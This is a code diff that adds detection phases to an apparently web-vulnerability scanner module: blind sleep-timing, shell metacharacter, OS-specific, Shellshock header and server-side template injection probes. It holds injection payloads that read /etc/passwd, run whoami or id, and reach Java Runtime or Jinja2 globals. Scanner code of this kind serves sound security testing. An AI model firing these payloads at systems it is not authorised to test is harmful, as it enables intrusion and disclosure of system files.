@@ -51,6 +51,76 @@ const SSTI_PAYLOADS = [
   { payload: "{{constructor.constructor('return 7*7')()}}", pattern: /49/, tag: "prototype-sandbox-escape" },
 ];
 
+// Blind command injection via timing — sleep-based with longer delays for clearer signal
+const BLIND_TIMING_PAYLOADS = [
+  { payload: "; sleep 5", label: "semicolon-sleep" },
+  { payload: "| sleep 5", label: "pipe-sleep" },
+  { payload: "$(sleep 5)", label: "subshell-sleep" },
+  { payload: "& sleep 5", label: "background-sleep" },
+  { payload: "`sleep 5`", label: "backtick-sleep" },
+  { payload: "%0asleep 5", label: "newline-sleep" },
+];
+
+// Special character injection payloads — exploit various shell metacharacters
+const SPECIAL_CHAR_PAYLOADS = [
+  { payload: "%0aid", pattern: /uid=\d+/, label: "newline-injection" },
+  { payload: "%0awhoami", pattern: /root|www-data|node|nobody|daemon/i, label: "newline-whoami" },
+  { payload: "`whoami`", pattern: /root|www-data|node|nobody|daemon/i, label: "backtick-exec" },
+  { payload: "$(whoami)", pattern: /root|www-data|node|nobody|daemon/i, label: "subshell-exec" },
+  { payload: "test|cat /etc/passwd", pattern: /root:.*:0:0/, label: "pipe-chain-passwd" },
+  { payload: "test;cat /etc/passwd", pattern: /root:.*:0:0/, label: "semicolon-chain-passwd" },
+  { payload: "test\nid", pattern: /uid=\d+/, label: "raw-newline-id" },
+  { payload: "${IFS}id", pattern: /uid=\d+/, label: "ifs-separator" },
+];
+
+// OS-specific command injection payloads
+const OS_SPECIFIC_PAYLOADS = [
+  // Linux/Unix indicators
+  { payload: ";cat /etc/passwd", pattern: /root:.*:0:0/, os: "linux", label: "cat-passwd" },
+  { payload: "$(cat /etc/passwd)", pattern: /root:.*:0:0/, os: "linux", label: "subshell-passwd" },
+  { payload: ";whoami", pattern: /root|www-data|node|nobody|daemon/i, os: "linux", label: "whoami" },
+  { payload: ";uname -a", pattern: /Linux|Darwin/i, os: "linux", label: "uname" },
+  { payload: ";ls /", pattern: /bin|etc|usr|var|tmp/i, os: "linux", label: "ls-root" },
+  // Windows indicators
+  { payload: "& dir C:\\", pattern: /Volume|Directory of|bytes free/i, os: "windows", label: "dir-c" },
+  { payload: "| type C:\\windows\\win.ini", pattern: /\[fonts\]|\[extensions\]|for 16-bit app support/i, os: "windows", label: "type-winini" },
+  { payload: "& whoami", pattern: /\\[a-zA-Z]+$/m, os: "windows", label: "win-whoami" },
+  { payload: "| ver", pattern: /Microsoft Windows|Version \d+/i, os: "windows", label: "ver" },
+  { payload: "& echo %OS%", pattern: /Windows_NT/i, os: "windows", label: "echo-os" },
+];
+
+// HTTP headers commonly used as injection vectors
+const HEADER_INJECTION_VECTORS = [
+  "User-Agent",
+  "Referer",
+  "X-Forwarded-For",
+  "X-Real-IP",
+  "X-Originating-IP",
+  "X-Custom-IP-Authorization",
+];
+
+// Header injection payloads
+const HEADER_PAYLOADS = [
+  { payload: "() { :; }; echo vibeshield_header_cmdi", pattern: /vibeshield_header_cmdi/, label: "shellshock" },
+  { payload: "| echo vibeshield_header_cmdi", pattern: /vibeshield_header_cmdi/, label: "pipe-echo" },
+  { payload: "; echo vibeshield_header_cmdi", pattern: /vibeshield_header_cmdi/, label: "semicolon-echo" },
+  { payload: "$(echo vibeshield_header_cmdi)", pattern: /vibeshield_header_cmdi/, label: "subshell-echo" },
+  { payload: "`echo vibeshield_header_cmdi`", pattern: /vibeshield_header_cmdi/, label: "backtick-echo" },
+];
+
+// Extended SSTI payloads for deeper template injection / RCE detection
+const EXTENDED_SSTI_PAYLOADS = [
+  { payload: "{{7*7}}", pattern: /49/, tag: "jinja2-twig-confirm" },
+  { payload: "${7*7}", pattern: /49/, tag: "freemarker-el-confirm" },
+  { payload: "<%= 7*7 %>", pattern: /49/, tag: "erb-ejs-confirm" },
+  { payload: "{{config}}", pattern: /SECRET_KEY|DEBUG|ENV/i, tag: "jinja2-config-leak" },
+  { payload: "{{self.__class__}}", pattern: /class|type|object/i, tag: "jinja2-class-introspection" },
+  { payload: "${T(java.lang.Runtime)}", pattern: /Runtime|java\.lang/i, tag: "spring-el-runtime" },
+  { payload: "{{request.application.__globals__}}", pattern: /builtins|os|subprocess/i, tag: "jinja2-globals-rce" },
+  { payload: "#set($x='')#set($rt=$x.class.forName('java.lang.Runtime'))", pattern: /Runtime|java/i, tag: "velocity-rce" },
+  { payload: "{{range.constructor(\"return global.process.mainModule\")()}}", pattern: /process|module/i, tag: "pug-rce" },
+];
+
 export const commandInjectionModule: ScanModule = async (target) => {
   const findings: Finding[] = [];
   let count = 0;
@@ -228,6 +298,136 @@ export const commandInjectionModule: ScanModule = async (target) => {
           if (pattern.test(text) && !pattern.test(baselineText)) {
             flagged.add(key);
             return { type: "ssti" as const, pathname, paramName: t.paramName, payload, tag, text: text.substring(0, 300) };
+          }
+        }
+      }
+
+      // Phase 5: Blind command injection via timing (sleep-based with 5s delay)
+      if (!flagged.has(key)) {
+        for (const { payload, label } of BLIND_TIMING_PAYLOADS) {
+          if (flagged.has(key)) break;
+          try {
+            const start = Date.now();
+            if (t.method === "GET") {
+              const url = new URL(t.url);
+              url.searchParams.set(t.paramName, `test${payload}`);
+              await scanFetch(url.href, { timeoutMs: 12000 });
+            } else {
+              await scanFetch(t.url, { method: "POST", headers: { "Content-Type": "application/x-www-form-urlencoded" }, body: `${t.paramName}=${encodeURIComponent(`test${payload}`)}`, timeoutMs: 12000 });
+            }
+            const elapsed = Date.now() - start;
+            if (elapsed >= 4500 && elapsed >= baseline * 3) {
+              // Confirm with shorter sleep
+              const confirmStart = Date.now();
+              const shortPayload = payload.replace("5", "2");
+              const confirmUrl = new URL(t.url);
+              confirmUrl.searchParams.set(t.paramName, `test${shortPayload}`);
+              try { await scanFetch(confirmUrl.href, { timeoutMs: 12000 }); } catch { /* skip */ }
+              const confirmElapsed = Date.now() - confirmStart;
+              if (confirmElapsed < elapsed * 0.7 && confirmElapsed >= 1800) {
+                flagged.add(key);
+                return { type: "blind-timing" as const, pathname, paramName: t.paramName, label, payload, elapsed, baseline, confirmElapsed };
+              }
+            }
+          } catch { /* skip */ }
+        }
+      }
+
+      // Phase 6: Command injection via special characters
+      if (!flagged.has(key)) {
+        const specialResults = await Promise.allSettled(
+          SPECIAL_CHAR_PAYLOADS.map(async ({ payload, pattern, label }) => {
+            let res: Response;
+            if (t.method === "GET") {
+              const url = new URL(t.url);
+              url.searchParams.set(t.paramName, payload);
+              res = await scanFetch(url.href, { timeoutMs: 5000 });
+            } else {
+              res = await scanFetch(t.url, { method: "POST", headers: { "Content-Type": "application/x-www-form-urlencoded" }, body: `${t.paramName}=${encodeURIComponent(payload)}`, timeoutMs: 5000 });
+            }
+            return { payload, pattern, label, text: await res.text() };
+          }),
+        );
+        for (const r of specialResults) {
+          if (r.status !== "fulfilled" || flagged.has(key)) continue;
+          const { payload, pattern, label, text } = r.value;
+          if (pattern.test(text) && !pattern.test(baselineText)) {
+            flagged.add(key);
+            return { type: "special-char" as const, pathname, paramName: t.paramName, payload, label, pattern: pattern.source, text: text.substring(0, 300) };
+          }
+        }
+      }
+
+      // Phase 7: OS-specific command injection payloads
+      if (!flagged.has(key)) {
+        const osResults = await Promise.allSettled(
+          OS_SPECIFIC_PAYLOADS.map(async ({ payload, pattern, os, label }) => {
+            let res: Response;
+            if (t.method === "GET") {
+              const url = new URL(t.url);
+              url.searchParams.set(t.paramName, `test${payload}`);
+              res = await scanFetch(url.href, { timeoutMs: 5000 });
+            } else {
+              res = await scanFetch(t.url, { method: "POST", headers: { "Content-Type": "application/x-www-form-urlencoded" }, body: `${t.paramName}=${encodeURIComponent(`test${payload}`)}`, timeoutMs: 5000 });
+            }
+            return { payload, pattern, os, label, text: await res.text() };
+          }),
+        );
+        for (const r of osResults) {
+          if (r.status !== "fulfilled" || flagged.has(key)) continue;
+          const { payload, pattern, os, label, text } = r.value;
+          if (pattern.test(text) && !pattern.test(baselineText)) {
+            flagged.add(key);
+            return { type: "os-specific" as const, pathname, paramName: t.paramName, payload, os, label, pattern: pattern.source, text: text.substring(0, 300) };
+          }
+        }
+      }
+
+      // Phase 8: Injection via HTTP headers
+      if (!flagged.has(key)) {
+        const headerResults = await Promise.allSettled(
+          HEADER_INJECTION_VECTORS.flatMap((header) =>
+            HEADER_PAYLOADS.slice(0, 3).map(async ({ payload, pattern, label }) => {
+              const res = await scanFetch(t.url, {
+                method: "GET",
+                headers: { [header]: payload },
+                timeoutMs: 5000,
+              });
+              return { header, payload, pattern, label, text: await res.text() };
+            }),
+          ),
+        );
+        for (const r of headerResults) {
+          if (r.status !== "fulfilled" || flagged.has(key)) continue;
+          const { header, payload, pattern, label, text } = r.value;
+          if (pattern.test(text) && !pattern.test(baselineText)) {
+            flagged.add(key);
+            return { type: "header-injection" as const, pathname, paramName: t.paramName, header, payload, label, text: text.substring(0, 300) };
+          }
+        }
+      }
+
+      // Phase 9: Extended template injection leading to RCE
+      if (!flagged.has(key)) {
+        const extSstiResults = await Promise.allSettled(
+          EXTENDED_SSTI_PAYLOADS.map(async ({ payload, pattern, tag }) => {
+            let res: Response;
+            if (t.method === "GET") {
+              const url = new URL(t.url);
+              url.searchParams.set(t.paramName, payload);
+              res = await scanFetch(url.href, { timeoutMs: 5000 });
+            } else {
+              res = await scanFetch(t.url, { method: "POST", headers: { "Content-Type": "application/x-www-form-urlencoded" }, body: `${t.paramName}=${encodeURIComponent(payload)}`, timeoutMs: 5000 });
+            }
+            return { payload, pattern, tag, text: await res.text() };
+          }),
+        );
+        for (const r of extSstiResults) {
+          if (r.status !== "fulfilled" || flagged.has(key)) continue;
+          const { payload, pattern, tag, text } = r.value;
+          if (pattern.test(text) && !pattern.test(baselineText)) {
+            flagged.add(key);
+            return { type: "extended-ssti" as const, pathname, paramName: t.paramName, payload, tag, text: text.substring(0, 300) };
           }
         }
       }
